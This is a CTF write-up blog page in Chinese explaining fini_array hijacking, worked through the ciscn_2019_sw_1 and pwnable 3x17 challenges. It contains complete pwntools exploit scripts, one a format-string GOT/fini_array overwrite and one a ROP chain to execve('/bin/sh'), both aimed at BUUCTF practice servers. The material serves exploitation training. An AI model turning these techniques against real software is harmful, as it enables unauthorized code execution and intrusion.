@@ -1,0 +1,237 @@
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script><!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>劫持fini_array | s4ndw1ch's Blog</title><meta name="author" content="s4ndw1ch"><meta name="copyright" content="s4ndw1ch"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="劫持fini_array 先贴一张程序的启动流程图 main 函数不是程序起点 text 段起点是_start函数 。_start 函数调用__libc_start_main 完成启动和退出工作 程序在加载的时候，会依次调用init.array数组中的每一个函数指针，在结束的时候，依次调用fini.array中的每一个函数指针 例题：ciscn_2019_sw_1checksec no relro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="劫持fini_array">
+<meta property="og:url" content="http://s4ndw1ch136.github.io/post/6ba7641f.html">
+<meta property="og:site_name" content="s4ndw1ch&#39;s Blog">
+<meta property="og:description" content="劫持fini_array 先贴一张程序的启动流程图 main 函数不是程序起点 text 段起点是_start函数 。_start 函数调用__libc_start_main 完成启动和退出工作 程序在加载的时候，会依次调用init.array数组中的每一个函数指针，在结束的时候，依次调用fini.array中的每一个函数指针 例题：ciscn_2019_sw_1checksec no relro">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://s4ndw1ch136.github.io/img/wallhaven-jx1dmq.jpg">
+<meta property="article:published_time" content="2023-10-10T08:49:39.000Z">
+<meta property="article:modified_time" content="2023-10-10T13:48:25.733Z">
+<meta property="article:author" content="s4ndw1ch">
+<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="hijack_fini_array">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://s4ndw1ch136.github.io/img/wallhaven-jx1dmq.jpg"><link rel="shortcut icon" href="/img/a.jpg"><link rel="canonical" href="http://s4ndw1ch136.github.io/post/6ba7641f.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '劫持fini_array',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-10 21:48:25'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mouse.css"><link rel="stylesheet" href="/css/touming.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/a.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">52</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">34</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about"><i class="fa-fw /about/"></i><span> 0</span></a></li><li><a class="site-page child" href="/myself"><i class="fa-fw /myself/"></i><span> 1</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/wallhaven-jx1dmq.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="s4ndw1ch's Blog"><span class="site-name">s4ndw1ch's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about"><i class="fa-fw /about/"></i><span> 0</span></a></li><li><a class="site-page child" href="/myself"><i class="fa-fw /myself/"></i><span> 1</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">劫持fini_array</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-10-10T08:49:39.000Z" title="Created 2023-10-10 16:49:39">2023-10-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-10-10T13:48:25.733Z" title="Updated 2023-10-10 21:48:25">2023-10-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="劫持fini_array"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="劫持fini-array"><a href="#劫持fini-array" class="headerlink" title="劫持fini_array"></a>劫持fini_array</h1><p><img src="/post/6ba7641f/1.png" alt="1"></p>
+<p>先贴一张程序的启动流程图</p>
+<p>main 函数不是程序起点 text 段起点是_start函数 。_start 函数调用__libc_start_main 完成启动和退出工作</p>
+<p>程序在加载的时候，会依次调用init.array数组中的每一个函数指针，在结束的时候，依次调用fini.array中的每一个函数指针</p>
+<h3 id="例题：ciscn-2019-sw-1"><a href="#例题：ciscn-2019-sw-1" class="headerlink" title="例题：ciscn_2019_sw_1"></a>例题：ciscn_2019_sw_1</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p><img src="/post/6ba7641f/2.PNG" alt="2"></p>
+<p>no relro可以修改fini_array</p>
+<p><img src="/post/6ba7641f/3.PNG" alt="3"></p>
+<p>有个格式化字符串漏洞，但是只有一次机会</p>
+<p><img src="/post/6ba7641f/5.PNG" alt="5"></p>
+<p>还有个system</p>
+<p>一次格式化字符串利用不够，所以我们要改finiarry为main，printf为system，这样程序再循环main，我们输入/bin/sh就拿到shell了</p>
+<h4 id="fini-array"><a href="#fini-array" class="headerlink" title="fini_array"></a>fini_array</h4><p>finiarry的位置获取方式：</p>
+<p>shift+f7打开IDA的Segments窗口</p>
+<p><img src="/post/6ba7641f/6.PNG" alt="6"></p>
+<p>或者elf.sym[‘__init_array_end’]都可</p>
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28031</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_sw_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_sw_1&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>] <span class="comment">#0x804989c</span></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#0x80483d0</span></span><br><span class="line">fini_array = elf.sym[<span class="string">&#x27;__init_array_end&#x27;</span>]  <span class="comment">#0x804979c</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment">#0x8048534</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offest = <span class="number">4</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = p32(fini_array + <span class="number">2</span>) + p32(printf_got+<span class="number">2</span>) + p32(printf_got) + p32(fini_array)</span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x0804</span> - <span class="number">0x10</span>) + <span class="string">&quot;c%4$hn&quot;</span>  </span><br><span class="line">payload += <span class="string">&quot;%5$hn&quot;</span>   </span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x83D0</span> - <span class="number">0x0804</span>) + <span class="string">&quot;c%6$hn&quot;</span>  </span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x8534</span> - <span class="number">0x83D0</span>) + <span class="string">&quot;c%7$hn&quot;</span>  </span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/6ba7641f/7.PNG" alt="7"></p>
+<h3 id="例题2：pwnable-317-x64静态编译程序的fini-array劫持"><a href="#例题2：pwnable-317-x64静态编译程序的fini-array劫持" class="headerlink" title="例题2：pwnable.317-x64静态编译程序的fini_array劫持"></a>例题2：pwnable.317-x64静态编译程序的fini_array劫持</h3><p>._start函数才是程序的入口点,他会调用<strong>libc_start_main函数,这里可以先看一下</strong>libc_start_main函数的原型:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main(main,argc,argv&amp;env,init,fini,rtld_fini)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 __libc_csu_fini proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: __libc_csu_fini+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: __libc_csu_fini+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     _term_proc</span><br><span class="line">.text:000000000040299C ; &#125; // starts at 402960</span><br><span class="line">.text:000000000040299C __libc_csu_fini endp</span><br></pre></td></tr></table></figure>
+
+<p>在.text:0000000000402988这个地方有一个call指令,结合前面的代码可以知道rbp保存的是fini_array的值,所以这里会调用fini_array中的函数.所以只要修改了fini_array的数值,我们就可以劫持eip.看一下fini_array的代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:00000000004B40F0 _fini_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.fini_array:00000000004B40F0                 assume cs:_fini_array</span><br><span class="line">.fini_array:00000000004B40F0                 ;org 4B40F0h</span><br><span class="line">.fini_array:00000000004B40F0 off_4B40F0      dq offset sub_401B00    ; DATA XREF: sub_4028D0+4C↑o</span><br><span class="line">.fini_array:00000000004B40F0                                         ; __libc_csu_fini+8↑o</span><br><span class="line">.fini_array:00000000004B40F8                 dq offset sub_401580</span><br><span class="line">.fini_array:00000000004B40F8 _fini_array     ends</span><br></pre></td></tr></table></figure>
+
+<p>这里保存了两个函数指针,分别是fini_array[0]和fini_array[1]这俩函数指针是反向执行的,先执行fini_array[1],再执行fini_array[0].如果我们将fini_array[0]覆盖为libc_csu_fini的地址,再将fini_array[1]覆盖为任意一个地址A,那么程序就会循环执行A地址的代码,直到fini_array[0]覆盖为其他值.</p>
+<p>其次,在.text:0000000000402968可以修改rbp为fini_array的首地址,配合leave;ret可以把栈迁移到fini_array</p>
+<h4 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h4><p><img src="/post/6ba7641f/8.PNG" alt="8"></p>
+<p><img src="/post/6ba7641f/9.PNG" alt="9"></p>
+<p><img src="/post/6ba7641f/10.PNG" alt="10"></p>
+<p><img src="/post/6ba7641f/11.PNG" alt="11"></p>
+<p>虽然开了Partial RELRO，但是我们可以看到0x4b4000 - 0x4ba000是可读可写的，也就是fini所在位置:0x4b40f0也是可写的</p>
+<p><img src="/post/6ba7641f/12.PNG" alt="12"></p>
+<p>程序功能就是向任意地址写0x18字节，但是只用1次是不够的，我们劫持fini_array[1]为main函数地址,fini_array[0]为__libc_csu_fini</p>
+<p>然后在fini_array+0x10地址处构造ROP chain</p>
+<p>构造完ROP chain之后,将fini_array[0]改为’leave;ret’,将fini_array[1]改为’ret’.这样,在执行完main函数(即fini_array[1])之后,程序去执行位于fini_array[0]的’leave;ret’,执行完之后,rip=fini_array[1],rsp=0x4b40f0+0x10.此时,fini_array[1]存放着我们放入的ret,这样,eip的值就被修改为了0x4b40f0+0x10.这也就是上一步我们将ROP链放在这个地址的原因.</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26797</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./3x17&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./3x17&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span>  </span><br><span class="line">esp = fini_array + <span class="number">0x10</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">syscall_ret = <span class="number">0x0000000000471db5</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000041e4af</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401696</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000406c30</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000446e35</span></span><br><span class="line">bin_sh_addr = <span class="number">0x4B9500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,data</span>):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line">write(bin_sh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">write(esp,p64(pop_rax_ret))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(pop_rdi_ret))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(pop_rsi_ret))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(pop_rdx_ret))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(syscall_ret))</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/6ba7641f/13.PNG" alt="13"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://s4ndw1ch136.github.io">s4ndw1ch</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://s4ndw1ch136.github.io/post/6ba7641f.html">http://s4ndw1ch136.github.io/post/6ba7641f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/hijack-fini-array/">hijack_fini_array</a></div><div class="post_share"><div class="social-share" data-image="/img/wallhaven-jx1dmq.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/2be638b5.html" title="西湖论剑_2018_小陈的笔记本加强版"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">西湖论剑_2018_小陈的笔记本加强版</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/post/a942ef61.html" title="BSidesCF2019-Runit"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-11</div><div class="title">BSidesCF2019-Runit</div></div></a></div><div><a href="/post/bb049d32.html" title="BUUCTF-ciscn_2019_es_7"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-11</div><div class="title">BUUCTF-ciscn_2019_es_7</div></div></a></div><div><a href="/post/16910.html" title="BUUCTF-pwnable_hacknote"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-08</div><div class="title">BUUCTF-pwnable_hacknote</div></div></a></div><div><a href="/post/a094319f.html" title="HITCON_2018_children_tcache"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-06</div><div class="title">HITCON_2018_children_tcache</div></div></a></div><div><a href="/post/30b5a622.html" title="axb_2019_heap"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-23</div><div class="title">axb_2019_heap</div></div></a></div><div><a href="/post/6a3e487b.html" title="ciscn_2019_en_3"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-01</div><div class="title">ciscn_2019_en_3</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">s4ndw1ch</div><div 